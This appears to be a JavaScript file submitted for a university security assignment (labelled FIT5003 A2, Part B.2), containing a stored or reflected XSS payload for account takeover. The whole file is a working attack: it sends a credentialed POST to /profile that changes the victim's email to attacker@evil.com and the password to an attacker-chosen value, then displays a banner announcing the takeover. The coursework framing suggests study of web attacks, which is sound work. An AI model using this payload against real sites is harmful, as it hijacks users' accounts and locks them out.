// FIT5003 A2 - Part B.2  external account-takeover payload.

(function () {
  fetch('/profile', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    credentials: 'include',
    body: 'email=attacker@evil.com&password=pwned-by-attacker'
  }).then(function () {
    var banner = document.createElement('div');
    banner.textContent = 'XSS payload executed: victim account taken over '
                       + '(email -> attacker@evil.com, password changed).';
    banner.style = 'background:#b00;color:#fff;padding:1rem;font-size:1.1rem';
    document.body.prepend(banner);
  });
})();
